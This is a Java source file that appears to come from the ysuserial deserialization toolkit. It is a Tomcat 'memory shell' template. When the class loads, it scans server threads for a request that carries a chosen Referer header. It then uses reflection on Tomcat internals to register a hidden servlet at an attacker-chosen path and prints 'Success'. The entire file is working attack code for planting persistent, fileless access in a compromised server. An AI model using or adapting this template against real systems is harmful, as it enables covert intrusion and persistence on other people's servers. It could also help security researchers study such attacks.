package org.su18.ysuserial.payloads.templates.memshell.tomcat;

import org.apache.catalina.Wrapper;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.ApplicationContextFacade;
import org.apache.catalina.core.ApplicationServletRegistration;
import org.apache.catalina.core.StandardContext;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.List;


/**
 * 遍历线程组，在 request 中查找带有特定 Referer 的请求，并从 request 获取 ServletContext 添加 Servlet 型内存马
 * 添加成功后，会回显 Success 字样，参考 ShiroAttack2
 *
 * @author su18
 */
public class TSMSFromRequest implements Servlet {

	public static HttpServletRequest request = null;

	public static HttpServletResponse response = null;

	public static String pattern;

	public static String referer;

	static {
		getRequestAndResponse();
		if (request != null && response != null) {
			addServlet();
		}
	}


	public static void getRequestAndResponse() {
		try {
			boolean  flag    = false;
			Thread[] threads = (Thread[]) getFieldValue(Thread.currentThread().getThreadGroup(), "threads");

			for (int i = 0; i < threads.length; ++i) {
				Thread thread = threads[i];
				if (thread != null) {
					String threadName = thread.getName();
					if (!threadName.contains("exec") && threadName.contains("http")) {
						Object target = getFieldValue(thread, "target");
						if (target instanceof Runnable) {
							try {
								target = getFieldValue(getFieldValue(getFieldValue(target, "this$0"), "handler"), "global");
							} catch (Exception ignored) {
								continue;
							}

							List processors = (List) getFieldValue(target, "processors");

							for (int j = 0; j < processors.size(); ++j) {
								Object processor = processors.get(j);
								target = getFieldValue(processor, "req");
								Object req        = target.getClass().getMethod("getNote", Integer.TYPE).invoke(target, new Integer(1));
								String reqReferer = (String) req.getClass().getMethod("getHeader", String.class).invoke(req, new String("Referer"));
								if (reqReferer != null && !reqReferer.isEmpty() && reqReferer.equals(referer)) {
									request = (HttpServletRequest) req;
									try {
										response = (HttpServletResponse) getFieldValue(getFieldValue(req, "request"), "response");
									} catch (Exception ignored) {
										try {
											response = (HttpServletResponse) invoke(req, "getResponse", (Object[]) null);
										} catch (Exception ignored2) {
										}
									}
									flag = true;
								}

								if (flag) {
									break;
								}
							}
						}
					}
				}
			}
		} catch (Exception ignored) {
		}
	}

	public static Object getFieldValue(Object obj, String fieldName) throws Exception {
		java.lang.reflect.Field f = null;
		if (obj instanceof java.lang.reflect.Field) {
			f = (java.lang.reflect.Field) obj;
		} else {
			Class cs = obj.getClass();
			while (cs != null) {
				try {
					f = cs.getDeclaredField(fieldName);
					cs = null;
				} catch (Exception e) {
					cs = cs.getSuperclass();
				}
			}
		}
		f.setAccessible(true);
		return f.get(obj);
	}


	public static void addServlet() {
		try {
			ServletContext           servletContext           = request.getServletContext();
			ApplicationContextFacade applicationContextFacade = (ApplicationContextFacade) servletContext;
			Field                    applicationContextField  = applicationContextFacade.getClass().getDeclaredField("context");
			applicationContextField.setAccessible(true);
			ApplicationContext applicationContext   = (ApplicationContext) applicationContextField.get(applicationContextFacade);
			Field              standardContextField = applicationContext.getClass().getDeclaredField("context");
			standardContextField.setAccessible(true);
			StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);
			Wrapper         wrapper         = standardContext.createWrapper();
			wrapper.setName(pattern);
			standardContext.addChild(wrapper);

			Servlet servlet = new TSMSFromRequest();
			wrapper.setServletClass(servlet.getClass().getName());

			wrapper.setServlet(servlet);
			ServletRegistration.Dynamic registration = new ApplicationServletRegistration(wrapper, standardContext);
			registration.addMapping(new String[]{pattern});
			registration.setLoadOnStartup(1);
			if (getMethodByClass(wrapper.getClass(), "setServlet", Servlet.class) == null) {
				transform(standardContext, pattern);
				servlet.init((ServletConfig) getFieldValue(wrapper, "facade"));
			}

			response.setContentType("text/html");
			request.setCharacterEncoding("UTF-8");
			response.setCharacterEncoding("UTF-8");
			response.getWriter().print("Success");
			response.getWriter().flush();
			response.getWriter().close();
		} catch (Exception ignored) {
		}
	}


	public static void transform(Object standardContext, String path) throws Exception {
		Object containerBase       = invoke(standardContext, "getParent", (Object[]) null);
		Class  mapperListenerClass = Class.forName("org.apache.catalina.connector.MapperListener", false, containerBase.getClass().getClassLoader());
		Field  listenersField      = Class.forName("org.apache.catalina.core.ContainerBase", false, containerBase.getClass().getClassLoader()).getDeclaredField("listeners");
		listenersField.setAccessible(true);
		ArrayList listeners = (ArrayList) listenersField.get(containerBase);

		for (int i = 0; i < listeners.size(); ++i) {
			Object mapperListener_Mapper = listeners.get(i);
			if (mapperListener_Mapper != null && mapperListenerClass.isAssignableFrom(mapperListener_Mapper.getClass())) {
				Object mapperListener_Mapper2      = getFieldValue(mapperListener_Mapper, "mapper");
				Object mapperListener_Mapper_hosts = getFieldValue(mapperListener_Mapper2, "hosts");

				for (int j = 0; j < Array.getLength(mapperListener_Mapper_hosts); ++j) {
					Object mapperListener_Mapper_host                       = Array.get(mapperListener_Mapper_hosts, j);
					Object mapperListener_Mapper_hosts_contextList          = getFieldValue(mapperListener_Mapper_host, "contextList");
					Object mapperListener_Mapper_hosts_contextList_contexts = getFieldValue(mapperListener_Mapper_hosts_contextList, "contexts");

					for (int k = 0; k < Array.getLength(mapperListener_Mapper_hosts_contextList_contexts); ++k) {
						Object mapperListener_Mapper_hosts_contextList_context = Array.get(mapperListener_Mapper_hosts_contextList_contexts, k);
						if (standardContext.equals(getFieldValue(mapperListener_Mapper_hosts_contextList_context, "object"))) {
							new ArrayList();
							Object standardContext_Mapper                                        = invoke(standardContext, "getMapper", (Object[]) null);
							Object standardContext_Mapper_Context                                = getFieldValue(standardContext_Mapper, "context");
							Object standardContext_Mapper_Context_exactWrappers                  = getFieldValue(standardContext_Mapper_Context, "exactWrappers");
							Object mapperListener_Mapper_hosts_contextList_context_exactWrappers = getFieldValue(mapperListener_Mapper_hosts_contextList_context, "exactWrappers");

							int    l;
							Object Mapper_Wrapper;
							Method addWrapperMethod;
							for (l = 0; l < Array.getLength(mapperListener_Mapper_hosts_contextList_context_exactWrappers); ++l) {
								Mapper_Wrapper = Array.get(mapperListener_Mapper_hosts_contextList_context_exactWrappers, l);
								if (path.equals(getFieldValue(Mapper_Wrapper, "name"))) {
									addWrapperMethod = mapperListener_Mapper2.getClass().getDeclaredMethod("removeWrapper", mapperListener_Mapper_hosts_contextList_context.getClass(), String.class);
									addWrapperMethod.setAccessible(true);
									addWrapperMethod.invoke(mapperListener_Mapper2, mapperListener_Mapper_hosts_contextList_context, path);
								}
							}

							for (l = 0; l < Array.getLength(standardContext_Mapper_Context_exactWrappers); ++l) {
								Mapper_Wrapper = Array.get(standardContext_Mapper_Context_exactWrappers, l);
								if (path.equals(getFieldValue(Mapper_Wrapper, "name"))) {
									addWrapperMethod = mapperListener_Mapper2.getClass().getDeclaredMethod("addWrapper", mapperListener_Mapper_hosts_contextList_context.getClass(), String.class, Object.class);
									addWrapperMethod.setAccessible(true);
									addWrapperMethod.invoke(mapperListener_Mapper2, mapperListener_Mapper_hosts_contextList_context, path, getFieldValue(Mapper_Wrapper, "object"));
								}
							}
						}
					}
				}
			}
		}
	}

	public static Method getMethodByClass(Class cs, String methodName, Class... parameters) {
		Method method = null;

		while (cs != null) {
			try {
				method = cs.getDeclaredMethod(methodName, parameters);
				cs = null;
			} catch (Exception var6) {
				cs = cs.getSuperclass();
			}
		}

		return method;
	}

	public static Object invoke(Object obj, String methodName, Object... parameters) {
		try {
			ArrayList classes = new ArrayList();
			if (parameters != null) {
				for (int i = 0; i < parameters.length; ++i) {
					Object o1 = parameters[i];
					if (o1 != null) {
						classes.add(o1.getClass());
					} else {
						classes.add((Object) null);
					}
				}
			}

			Method method = getMethodByClass(obj.getClass(), methodName, (Class[]) ((Class[]) classes.toArray(new Class[0])));
			return method.invoke(obj, parameters);
		} catch (Exception var7) {
			return null;
		}
	}


	@Override
	public void init(ServletConfig servletConfig) throws ServletException {
	}

	@Override
	public ServletConfig getServletConfig() {
		return null;
	}

	@Override
	public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
	}

	@Override
	public String getServletInfo() {
		return null;
	}

	@Override
	public void destroy() {
	}
}
